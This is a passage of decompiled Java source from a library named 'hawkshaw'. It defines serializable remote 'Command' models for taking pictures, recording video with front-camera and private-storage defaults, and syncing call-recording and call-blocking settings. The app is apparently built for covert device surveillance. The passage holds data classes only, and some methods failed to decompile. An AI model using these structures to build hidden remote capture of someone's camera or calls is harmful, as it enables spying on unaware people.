                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode r9 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashMode.Off
                if (r1 == r9) goto L_0x00ee
            L_0x00e2:
                r1 = 9
                r9 = r0[r1]
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode r10 = r12.flashMode
                r11 = r13
                p3.q r11 = (p3.q) r11
                r11.e0(r14, r1, r9, r10)
            L_0x00ee:
                boolean r1 = r13.q(r14)
                if (r1 == 0) goto L_0x00f5
                goto L_0x00fb
            L_0x00f5:
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$AspectRatio r1 = r12.aspectRatio
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$AspectRatio r9 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.AspectRatio.RATIO_4_3
                if (r1 == r9) goto L_0x0107
            L_0x00fb:
                r1 = 10
                r9 = r0[r1]
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$AspectRatio r10 = r12.aspectRatio
                r11 = r13
                p3.q r11 = (p3.q) r11
                r11.e0(r14, r1, r9, r10)
            L_0x0107:
                boolean r1 = r13.q(r14)
                if (r1 == 0) goto L_0x010e
                goto L_0x0112
            L_0x010e:
                boolean r1 = r12.saveToPrivate
                if (r1 == r3) goto L_0x011c
            L_0x0112:
                boolean r1 = r12.saveToPrivate
                r9 = r13
                p3.q r9 = (p3.q) r9
                r10 = 11
                r9.X(r14, r10, r1)
            L_0x011c:
                boolean r1 = r13.q(r14)
                if (r1 == 0) goto L_0x0123
                goto L_0x0129
            L_0x0123:
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$LensFacing r1 = r12.lensFacing
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$LensFacing r9 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.LensFacing.Front
                if (r1 == r9) goto L_0x0135
            L_0x0129:
                r1 = 12
                r9 = r0[r1]
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$LensFacing r10 = r12.lensFacing
                r11 = r13
                p3.q r11 = (p3.q) r11
                r11.e0(r14, r1, r9, r10)
            L_0x0135:
                boolean r1 = r13.q(r14)
                if (r1 == 0) goto L_0x013c
                goto L_0x0142
            L_0x013c:
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r1 = r12.rotation
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r9 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Rotation.Auto
                if (r1 == r9) goto L_0x014e
            L_0x0142:
                r1 = 13
                r0 = r0[r1]
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r9 = r12.rotation
                r10 = r13
                p3.q r10 = (p3.q) r10
                r10.e0(r14, r1, r0, r9)
            L_0x014e:
                boolean r0 = r13.q(r14)
                if (r0 == 0) goto L_0x0155
                goto L_0x0170
            L_0x0155:
                int r0 = r12.mLensFacing
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$LensFacing r1 = r12.lensFacing
                int[] r9 = com.hawkshaw.library.datalayer.models.Command.RecordVideoRequest.WhenMappings.$EnumSwitchMapping$0
                int r1 = r1.ordinal()
                r1 = r9[r1]
                if (r1 == r3) goto L_0x016d
                if (r1 != r5) goto L_0x0167
                r1 = r3
                goto L_0x016e
            L_0x0167:
                W2.x r12 = new W2.x
                r12.<init>()
                throw r12
            L_0x016d:
                r1 = r2
            L_0x016e:
                if (r0 == r1) goto L_0x017a
            L_0x0170:
                int r0 = r12.mLensFacing
                r1 = r13
                p3.q r1 = (p3.q) r1
                r9 = 14
                r1.c0(r9, r0, r14)
            L_0x017a:
                boolean r0 = r13.q(r14)
                if (r0 == 0) goto L_0x0181
                goto L_0x01b8
            L_0x0181:
                java.lang.Integer r0 = r12.mRotation
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r1 = r12.rotation
                int[] r9 = com.hawkshaw.library.datalayer.models.Command.RecordVideoRequest.WhenMappings.$EnumSwitchMapping$1
                int r1 = r1.ordinal()
                r1 = r9[r1]
                if (r1 == r3) goto L_0x01ae
                if (r1 == r5) goto L_0x01a9
                if (r1 == r6) goto L_0x01a4
                if (r1 == r7) goto L_0x019f
                if (r1 != r8) goto L_0x0199
                r1 = 0
                goto L_0x01b2
            L_0x0199:
                W2.x r12 = new W2.x
                r12.<init>()
                throw r12
            L_0x019f:
                java.lang.Integer r1 = java.lang.Integer.valueOf(r6)
                goto L_0x01b2
            L_0x01a4:
                java.lang.Integer r1 = java.lang.Integer.valueOf(r5)
                goto L_0x01b2
            L_0x01a9:
                java.lang.Integer r1 = java.lang.Integer.valueOf(r3)
                goto L_0x01b2
            L_0x01ae:
                java.lang.Integer r1 = java.lang.Integer.valueOf(r2)
            L_0x01b2:
                boolean r0 = Y1.K.f(r0, r1)
                if (r0 != 0) goto L_0x01c1
            L_0x01b8:
                E3.O r0 = E3.O.f456a
                java.lang.Integer r1 = r12.mRotation
                r7 = 15
                r13.s(r14, r7, r0, r1)
            L_0x01c1:
                boolean r0 = r13.q(r14)
                if (r0 == 0) goto L_0x01c8
                goto L_0x01e7
            L_0x01c8:
                int r0 = r12.mFlashMode
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode r1 = r12.flashMode
                int[] r7 = com.hawkshaw.library.datalayer.models.Command.RecordVideoRequest.WhenMappings.$EnumSwitchMapping$2
                int r1 = r1.ordinal()
                r1 = r7[r1]
                if (r1 == r3) goto L_0x01e4
                if (r1 == r5) goto L_0x01e2
                if (r1 != r6) goto L_0x01dc
                r1 = r5
                goto L_0x01e5
            L_0x01dc:
                W2.x r12 = new W2.x
                r12.<init>()
                throw r12
            L_0x01e2:
                r1 = r3
                goto L_0x01e5
            L_0x01e4:
                r1 = r2
            L_0x01e5:
                if (r0 == r1) goto L_0x01ef
            L_0x01e7:
                int r0 = r12.mFlashMode
                r1 = r13
                p3.q r1 = (p3.q) r1
                r1.c0(r4, r0, r14)
            L_0x01ef:
                boolean r0 = r13.q(r14)
                if (r0 == 0) goto L_0x01f6
                goto L_0x0210
            L_0x01f6:
                int r0 = r12.mAspectRatio
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$AspectRatio r1 = r12.aspectRatio
                int[] r4 = com.hawkshaw.library.datalayer.models.Command.RecordVideoRequest.WhenMappings.$EnumSwitchMapping$3
                int r1 = r1.ordinal()
                r1 = r4[r1]
                if (r1 == r3) goto L_0x020e
                if (r1 != r5) goto L_0x0208
                r2 = r3
                goto L_0x020e
            L_0x0208:
                W2.x r12 = new W2.x
                r12.<init>()
                throw r12
            L_0x020e:
                if (r0 == r2) goto L_0x0219
            L_0x0210:
                int r12 = r12.mAspectRatio
                p3.q r13 = (p3.q) r13
                r0 = 17
                r13.c0(r0, r12, r14)
            L_0x0219:
                return
            
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.Command.RecordVideoRequest.write$Self$library_release(com.hawkshaw.library.datalayer.models.Command$RecordVideoRequest, D3.b, kotlinx.serialization.descriptors.SerialDescriptor):void");
        }

        public final int getAudioBitRate() {
            return this.audioBitRate;
        }

        public final int getAudioChannelCount() {
            return this.audioChannelCount;
        }

        public final int getAudioMinBufferSize() {
            return this.audioMinBufferSize;
        }

        public final int getAudioSampleRate() {
            return this.audioSampleRate;
        }

        public final int getBitRate() {
            return this.bitRate;
        }

        public final long getDuration() {
            return this.duration;
        }

        public final int getIFrameInterval() {
            return this.iFrameInterval;
        }

        public final int getMAspectRatio() {
            return this.mAspectRatio;
        }

        public final int getMFlashMode() {
            return this.mFlashMode;
        }

        public final int getMLensFacing() {
            return this.mLensFacing;
        }

        public final Integer getMRotation() {
            return this.mRotation;
        }

        public final TakePictureRequest.Size getMaxResolution() {
            return this.maxResolution;
        }

        public final boolean getSaveToPrivate() {
            return this.saveToPrivate;
        }

        public final int getVideoFrameRate() {
            return this.videoFrameRate;
        }

        public /* synthetic */ RecordVideoRequest(int i5, long j5, int i6, int i7, int i8, int i9, int i10, int i11, int i12, TakePictureRequest.Size size, TakePictureRequest.FlashMode flashMode2, TakePictureRequest.AspectRatio aspectRatio2, boolean z4, TakePictureRequest.LensFacing lensFacing2, TakePictureRequest.Rotation rotation2, int i13, Integer num, int i14, int i15, q0 q0Var) {
            TakePictureRequest.Size size2;
            TakePictureRequest.FlashMode flashMode3;
            TakePictureRequest.AspectRatio aspectRatio3;
            TakePictureRequest.LensFacing lensFacing3;
            TakePictureRequest.Rotation rotation3;
            int i16;
            int i17;
            int i18;
            int i19 = i5;
            this.duration = (i19 & 1) == 0 ? 30000 : j5;
            this.videoFrameRate = (i19 & 2) == 0 ? 16 : i6;
            this.bitRate = (i19 & 4) == 0 ? 8388608 : i7;
            int i20 = 1;
            if ((i19 & 8) == 0) {
                this.iFrameInterval = 1;
            } else {
                this.iFrameInterval = i8;
            }
            this.audioBitRate = (i19 & 16) == 0 ? 64000 : i9;
            this.audioSampleRate = (i19 & 32) == 0 ? 8000 : i10;
            if ((i19 & 64) == 0) {
                this.audioChannelCount = 1;
            } else {
                this.audioChannelCount = i11;
            }
            this.audioMinBufferSize = (i19 & 128) == 0 ? 1024 : i12;
            if ((i19 & 256) == 0) {
                size2 = new TakePictureRequest.Size(1200, 1600);
            } else {
                size2 = size;
            }
            this.maxResolution = size2;
            if ((i19 & NotificationCompat.FLAG_GROUP_SUMMARY) == 0) {
                flashMode3 = TakePictureRequest.FlashMode.Off;
            } else {
                flashMode3 = flashMode2;
            }
            this.flashMode = flashMode3;
            if ((i19 & 1024) == 0) {
                aspectRatio3 = TakePictureRequest.AspectRatio.RATIO_4_3;
            } else {
                aspectRatio3 = aspectRatio2;
            }
            this.aspectRatio = aspectRatio3;
            if ((i19 & 2048) == 0) {
                this.saveToPrivate = true;
            } else {
                this.saveToPrivate = z4;
            }
            if ((i19 & NotificationCompat.FLAG_BUBBLE) == 0) {
                lensFacing3 = TakePictureRequest.LensFacing.Front;
            } else {
                lensFacing3 = lensFacing2;
            }
            this.lensFacing = lensFacing3;
            if ((i19 & 8192) == 0) {
                rotation3 = TakePictureRequest.Rotation.Auto;
            } else {
                rotation3 = rotation2;
            }
            this.rotation = rotation3;
            if ((i19 & 16384) == 0) {
                int i21 = WhenMappings.$EnumSwitchMapping$0[this.lensFacing.ordinal()];
                if (i21 == 1) {
                    i16 = 0;
                } else if (i21 == 2) {
                    i16 = 1;
                } else {
                    throw new RuntimeException();
                }
            } else {
                i16 = i13;
            }
            this.mLensFacing = i16;
            if ((32768 & i19) == 0) {
                int i22 = WhenMappings.$EnumSwitchMapping$1[this.rotation.ordinal()];
                if (i22 == 1) {
                    i17 = 0;
                } else if (i22 == 2) {
                    i17 = 1;
                } else if (i22 == 3) {
                    i17 = 2;
                } else if (i22 == 4) {
                    i17 = 3;
                } else if (i22 == 5) {
                    i17 = null;
                } else {
                    throw new RuntimeException();
                }
            } else {
                i17 = num;
            }
            this.mRotation = i17;
            if ((65536 & i19) == 0) {
                int i23 = WhenMappings.$EnumSwitchMapping$2[this.flashMode.ordinal()];
                if (i23 == 1) {
                    i18 = 0;
                } else if (i23 == 2) {
                    i18 = 1;
                } else if (i23 == 3) {
                    i18 = 2;
                } else {
                    throw new RuntimeException();
                }
            } else {
                i18 = i14;
            }
            this.mFlashMode = i18;
            if ((i19 & 131072) == 0) {
                int i24 = WhenMappings.$EnumSwitchMapping$3[this.aspectRatio.ordinal()];
                if (i24 == 1) {
                    i20 = 0;
                } else if (i24 != 2) {
                    throw new RuntimeException();
                }
                this.mAspectRatio = i20;
                return;
            }
            this.mAspectRatio = i15;
        }

        /* JADX WARNING: Illegal instructions before constructor call */
        /* Code decompiled incorrectly, please refer to instructions dump. */
        public /* synthetic */ RecordVideoRequest(long r16, int r18, int r19, int r20, int r21, int r22, int r23, int r24, com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Size r25, com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashMode r26, com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.AspectRatio r27, boolean r28, com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.LensFacing r29, com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Rotation r30, int r31, j3.f r32) {
            
                r15 = this;
                r0 = r31
                r1 = r0 & 1
                if (r1 == 0) goto L_0x0009
                r1 = 30000(0x7530, double:1.4822E-319)
                goto L_0x000b
            L_0x0009:
                r1 = r16
            L_0x000b:
                r3 = r0 & 2
                if (r3 == 0) goto L_0x0012
                r3 = 16
                goto L_0x0014
            L_0x0012:
                r3 = r18
            L_0x0014:
                r4 = r0 & 4
                if (r4 == 0) goto L_0x001b
                r4 = 8388608(0x800000, float:1.1754944E-38)
                goto L_0x001d
            L_0x001b:
                r4 = r19
            L_0x001d:
                r5 = r0 & 8
                r6 = 1
                if (r5 == 0) goto L_0x0024
                r5 = r6
                goto L_0x0026
            L_0x0024:
                r5 = r20
            L_0x0026:
                r7 = r0 & 16
                if (r7 == 0) goto L_0x002e
                r7 = 64000(0xfa00, float:8.9683E-41)
                goto L_0x0030
            L_0x002e:
                r7 = r21
            L_0x0030:
                r8 = r0 & 32
                if (r8 == 0) goto L_0x0037
                r8 = 8000(0x1f40, float:1.121E-41)
                goto L_0x0039
            L_0x0037:
                r8 = r22
            L_0x0039:
                r9 = r0 & 64
                if (r9 == 0) goto L_0x003f
                r9 = r6
                goto L_0x0041
            L_0x003f:
                r9 = r23
            L_0x0041:
                r10 = r0 & 128(0x80, float:1.8E-43)
                if (r10 == 0) goto L_0x0048
                r10 = 1024(0x400, float:1.435E-42)
                goto L_0x004a
            L_0x0048:
                r10 = r24
            L_0x004a:
                r11 = r0 & 256(0x100, float:3.59E-43)
                if (r11 == 0) goto L_0x0058
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size r11 = new com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size
                r12 = 1200(0x4b0, float:1.682E-42)
                r13 = 1600(0x640, float:2.242E-42)
                r11.<init>(r12, r13)
                goto L_0x005a
            L_0x0058:
                r11 = r25
            L_0x005a:
                r12 = r0 & 512(0x200, float:7.17E-43)
                if (r12 == 0) goto L_0x0061
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode r12 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashMode.Off
                goto L_0x0063
            L_0x0061:
                r12 = r26
            L_0x0063:
                r13 = r0 & 1024(0x400, float:1.435E-42)
                if (r13 == 0) goto L_0x006a
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$AspectRatio r13 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.AspectRatio.RATIO_4_3
                goto L_0x006c
            L_0x006a:
                r13 = r27
            L_0x006c:
                r14 = r0 & 2048(0x800, float:2.87E-42)
                if (r14 == 0) goto L_0x0071
                goto L_0x0073
            L_0x0071:
                r6 = r28
            L_0x0073:
                r14 = r0 & 4096(0x1000, float:5.74E-42)
                if (r14 == 0) goto L_0x007a
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$LensFacing r14 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.LensFacing.Front
                goto L_0x007c
            L_0x007a:
                r14 = r29
            L_0x007c:
                r0 = r0 & 8192(0x2000, float:1.148E-41)
                if (r0 == 0) goto L_0x0083
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r0 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Rotation.Auto
                goto L_0x0085
            L_0x0083:
                r0 = r30
            L_0x0085:
                r16 = r15
                r17 = r1
                r19 = r3
                r20 = r4
                r21 = r5
                r22 = r7
                r23 = r8
                r24 = r9
                r25 = r10
                r26 = r11
                r27 = r12
                r28 = r13
                r29 = r6
                r30 = r14
                r31 = r0
                r16.<init>(r17, r19, r20, r21, r22, r23, r24, r25, r26, r27, r28, r29, r30, r31)
                return
            
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.Command.RecordVideoRequest.<init>(long, int, int, int, int, int, int, int, com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size, com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode, com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$AspectRatio, boolean, com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$LensFacing, com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation, int, j3.f):void");
        }

        public RecordVideoRequest(long j5, int i5, int i6, int i7, int i8, int i9, int i10, int i11, TakePictureRequest.Size size, TakePictureRequest.FlashMode flashMode2, TakePictureRequest.AspectRatio aspectRatio2, boolean z4, TakePictureRequest.LensFacing lensFacing2, TakePictureRequest.Rotation rotation2) {
            int i12;
            int i13;
            int i14;
            TakePictureRequest.Size size2 = size;
            TakePictureRequest.FlashMode flashMode3 = flashMode2;
            TakePictureRequest.AspectRatio aspectRatio3 = aspectRatio2;
            TakePictureRequest.LensFacing lensFacing3 = lensFacing2;
            TakePictureRequest.Rotation rotation3 = rotation2;
            K.n(size2, "maxResolution");
            K.n(flashMode3, "flashMode");
            K.n(aspectRatio3, "aspectRatio");
            K.n(lensFacing3, "lensFacing");
            K.n(rotation3, "rotation");
            this.duration = j5;
            this.videoFrameRate = i5;
            this.bitRate = i6;
            this.iFrameInterval = i7;
            this.audioBitRate = i8;
            this.audioSampleRate = i9;
            this.audioChannelCount = i10;
            this.audioMinBufferSize = i11;
            this.maxResolution = size2;
            this.flashMode = flashMode3;
            this.aspectRatio = aspectRatio3;
            this.saveToPrivate = z4;
            this.lensFacing = lensFacing3;
            this.rotation = rotation3;
            int i15 = WhenMappings.$EnumSwitchMapping$0[lensFacing2.ordinal()];
            int i16 = 0;
            if (i15 == 1) {
                i12 = 0;
            } else if (i15 == 2) {
                i12 = 1;
            } else {
                throw new RuntimeException();
            }
            this.mLensFacing = i12;
            int i17 = WhenMappings.$EnumSwitchMapping$1[rotation2.ordinal()];
            if (i17 == 1) {
                i13 = 0;
            } else if (i17 == 2) {
                i13 = 1;
            } else if (i17 == 3) {
                i13 = 2;
            } else if (i17 == 4) {
                i13 = 3;
            } else if (i17 == 5) {
                i13 = null;
            } else {
                throw new RuntimeException();
            }
            this.mRotation = i13;
            int i18 = WhenMappings.$EnumSwitchMapping$2[flashMode2.ordinal()];
            if (i18 == 1) {
                i14 = 0;
            } else if (i18 == 2) {
                i14 = 1;
            } else if (i18 == 3) {
                i14 = 2;
            } else {
                throw new RuntimeException();
            }
            this.mFlashMode = i14;
            int i19 = WhenMappings.$EnumSwitchMapping$3[aspectRatio2.ordinal()];
            if (i19 != 1) {
                if (i19 == 2) {
                    i16 = 1;
                } else {
                    throw new RuntimeException();
                }
            }
            this.mAspectRatio = i16;
        }
    }

    @f
    public static final class SyncAppConfigRequest {
        /* access modifiers changed from: private */
        public static final KSerializer[] $childSerializers = {new C0020d(SyncType.Companion.serializer(), 0)};
        public static final Companion Companion = new Companion((j3.f) null);
        private final List<SyncType> syncTypes;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$SyncAppConfigRequest$$serializer.INSTANCE;
            }
        }

        @f
        public enum SyncType {
            All,
            CallBlocking,
            CallRecording,
            DynamicConfig;
            
            /* access modifiers changed from: private */
            public static final e $cachedSerializer$delegate = null;
            public static final Companion Companion = null;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                private final /* synthetic */ KSerializer get$cachedSerializer() {
                    return (KSerializer) SyncType.$cachedSerializer$delegate.getValue();
                }

                public final KSerializer serializer() {
                    return get$cachedSerializer();
                }
            }

            static {
                SyncType[] $values;
                $ENTRIES = K.J($values);
                Companion = new Companion((j3.f) null);
                $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, m.f4897D);
            }

            public static C0393a getEntries() {
                return $ENTRIES;
            }
        }

        public SyncAppConfigRequest() {
            this((List) null, 1, (j3.f) null);
        }

        public static /* synthetic */ void getSyncTypes$annotations() {
        }

        public static final /* synthetic */ void write$Self$library_release(SyncAppConfigRequest syncAppConfigRequest, b bVar, SerialDescriptor serialDescriptor) {
            KSerializer[] kSerializerArr = $childSerializers;
            if (bVar.q(serialDescriptor) || !K.f(syncAppConfigRequest.syncTypes, K.Y(SyncType.All))) {
                bVar.s(serialDescriptor, 0, kSerializerArr[0], syncAppConfigRequest.syncTypes);
            }
        }

        public final List<SyncType> getSyncTypes() {
            return this.syncTypes;
        }

        /* JADX INFO: this call moved to the top of the method (can break code semantics) */
        public /* synthetic */ SyncAppConfigRequest(List list, int i5, j3.f fVar) {
            this((i5 & 1) != 0 ? K.Y(SyncType.All) : list);
        }

        public /* synthetic */ SyncAppConfigRequest(int i5, List list, q0 q0Var) {
            if ((i5 & 1) == 0) {
                this.syncTypes = K.Y(SyncType.All);
            } else {
                this.syncTypes = list;
            }
        }

        public SyncAppConfigRequest(List<? extends SyncType> list) {
            this.syncTypes = list;
        }
    }

    @f
    public static final class TakePictureRequest {
        /* access modifiers changed from: private */
        public static final KSerializer[] $childSerializers = {null, null, null, null, CaptureMode.Companion.serializer(), FlashMode.Companion.serializer(), FlashType.Companion.serializer(), LensFacing.Companion.serializer(), AspectRatio.Companion.serializer(), Rotation.Companion.serializer(), null, null, null, null, null, null};
        public static final Companion Companion = new Companion((j3.f) null);
        private final AspectRatio aspectRatio;
        private final CaptureMode captureMode;
        private final FlashMode flashMode;
        private final FlashType flashType;
        private final int jpegQuality;
        private final LensFacing lensFacing;
        private final int mAspectRatio;
        private final int mCaptureMode;
        private final int mFlashMode;
        private final int mFlashType;
        private final int mLensFacing;
        private final Integer mRotation;
        private final Rotation rotation;
        private final boolean saveToPrivate;
        private final Size size;
        private final long takePictureDelay;

        @f
        public enum AspectRatio {
            RATIO_4_3,
            RATIO_16_9;
            
            /* access modifiers changed from: private */
            public static final e $cachedSerializer$delegate = null;
            public static final Companion Companion = null;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                private final /* synthetic */ KSerializer get$cachedSerializer() {
                    return (KSerializer) AspectRatio.$cachedSerializer$delegate.getValue();
                }

                public final KSerializer serializer() {
                    return get$cachedSerializer();
                }
            }

            static {
                AspectRatio[] $values;
                $ENTRIES = K.J($values);
                Companion = new Companion((j3.f) null);
                $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, n.f4898D);
            }

            public static C0393a getEntries() {
                return $ENTRIES;
            }
        }

        @f
        public enum CaptureMode {
            MaximizeQuality,
            MinimizeLatency,
            ZeroShutterLag;
            
            /* access modifiers changed from: private */
            public static final e $cachedSerializer$delegate = null;
            public static final Companion Companion = null;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                private final /* synthetic */ KSerializer get$cachedSerializer() {
                    return (KSerializer) CaptureMode.$cachedSerializer$delegate.getValue();
                }

                public final KSerializer serializer() {
                    return get$cachedSerializer();
                }
            }

            static {
                CaptureMode[] $values;
                $ENTRIES = K.J($values);
                Companion = new Companion((j3.f) null);
                $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, o.f4899D);
            }

            public static C0393a getEntries() {
                return $ENTRIES;
            }
        }

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$TakePictureRequest$$serializer.INSTANCE;
            }
        }

        @f
        public enum FlashMode {
            Auto,
            On,
            Off;
            
            /* access modifiers changed from: private */
            public static final e $cachedSerializer$delegate = null;
            public static final Companion Companion = null;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                private final /* synthetic */ KSerializer get$cachedSerializer() {
                    return (KSerializer) FlashMode.$cachedSerializer$delegate.getValue();
                }

                public final KSerializer serializer() {
                    return get$cachedSerializer();
                }
            }

            static {
                FlashMode[] $values;
                $ENTRIES = K.J($values);
                Companion = new Companion((j3.f) null);
                $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, p.f4900D);
            }

            public static C0393a getEntries() {
                return $ENTRIES;
            }
        }

        @f
        public enum FlashType {
            OneShot,
            Torch;
            
            /* access modifiers changed from: private */
            public static final e $cachedSerializer$delegate = null;
            public static final Companion Companion = null;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                private final /* synthetic */ KSerializer get$cachedSerializer() {
                    return (KSerializer) FlashType.$cachedSerializer$delegate.getValue();
                }

                public final KSerializer serializer() {
                    return get$cachedSerializer();
                }
            }

            static {
                FlashType[] $values;
                $ENTRIES = K.J($values);
                Companion = new Companion((j3.f) null);
                $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, q.f4901D);
            }

            public static C0393a getEntries() {
                return $ENTRIES;
            }
        }

        @f
        public enum LensFacing {
            Front,
            Back;
            
            /* access modifiers changed from: private */
            public static final e $cachedSerializer$delegate = null;
            public static final Companion Companion = null;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                private final /* synthetic */ KSerializer get$cachedSerializer() {
                    return (KSerializer) LensFacing.$cachedSerializer$delegate.getValue();
                }

                public final KSerializer serializer() {
                    return get$cachedSerializer();
                }
            }

            static {
                LensFacing[] $values;
                $ENTRIES = K.J($values);
                Companion = new Companion((j3.f) null);
                $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, r.f4902D);
            }

            public static C0393a getEntries() {
                return $ENTRIES;
            }
        }

        @f
        public enum Rotation {
            Auto,
            ROTATION_0,
            ROTATION_90,
            ROTATION_180,
            ROTATION_270;
            
            /* access modifiers changed from: private */
            public static final e $cachedSerializer$delegate = null;
            public static final Companion Companion = null;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                private final /* synthetic */ KSerializer get$cachedSerializer() {
                    return (KSerializer) Rotation.$cachedSerializer$delegate.getValue();
                }

                public final KSerializer serializer() {
                    return get$cachedSerializer();
                }
            }

            static {
                Rotation[] $values;
                $ENTRIES = K.J($values);
                Companion = new Companion((j3.f) null);
                $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, s.f4903D);
            }

            public static C0393a getEntries() {
                return $ENTRIES;
            }
        }

        public /* synthetic */ class WhenMappings {
            public static final /* synthetic */ int[] $EnumSwitchMapping$0;
            public static final /* synthetic */ int[] $EnumSwitchMapping$1;
            public static final /* synthetic */ int[] $EnumSwitchMapping$2;
            public static final /* synthetic */ int[] $EnumSwitchMapping$3;
            public static final /* synthetic */ int[] $EnumSwitchMapping$4;
            public static final /* synthetic */ int[] $EnumSwitchMapping$5;

            static {
                
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$CaptureMode[] r0 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.CaptureMode.values()
                    int r0 = r0.length
                    int[] r0 = new int[r0]
                    r1 = 1
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$CaptureMode r2 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.CaptureMode.MaximizeQuality     // Catch:{ NoSuchFieldError -> 0x0010 }
                    int r2 = r2.ordinal()     // Catch:{ NoSuchFieldError -> 0x0010 }
                    r0[r2] = r1     // Catch:{ NoSuchFieldError -> 0x0010 }
                L_0x0010:
                    r2 = 2
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$CaptureMode r3 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.CaptureMode.MinimizeLatency     // Catch:{ NoSuchFieldError -> 0x0019 }
                    int r3 = r3.ordinal()     // Catch:{ NoSuchFieldError -> 0x0019 }
                    r0[r3] = r2     // Catch:{ NoSuchFieldError -> 0x0019 }
                L_0x0019:
                    r3 = 3
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$CaptureMode r4 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.CaptureMode.ZeroShutterLag     // Catch:{ NoSuchFieldError -> 0x0022 }
                    int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x0022 }
                    r0[r4] = r3     // Catch:{ NoSuchFieldError -> 0x0022 }
                L_0x0022:
                    $EnumSwitchMapping$0 = r0
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode[] r0 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashMode.values()
                    int r0 = r0.length
                    int[] r0 = new int[r0]
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode r4 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashMode.Auto     // Catch:{ NoSuchFieldError -> 0x0033 }
                    int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x0033 }
                    r0[r4] = r1     // Catch:{ NoSuchFieldError -> 0x0033 }
                L_0x0033:
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode r4 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashMode.On     // Catch:{ NoSuchFieldError -> 0x003b }
                    int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x003b }
                    r0[r4] = r2     // Catch:{ NoSuchFieldError -> 0x003b }
                L_0x003b:
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode r4 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashMode.Off     // Catch:{ NoSuchFieldError -> 0x0043 }
                    int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x0043 }
                    r0[r4] = r3     // Catch:{ NoSuchFieldError -> 0x0043 }
                L_0x0043:
                    $EnumSwitchMapping$1 = r0
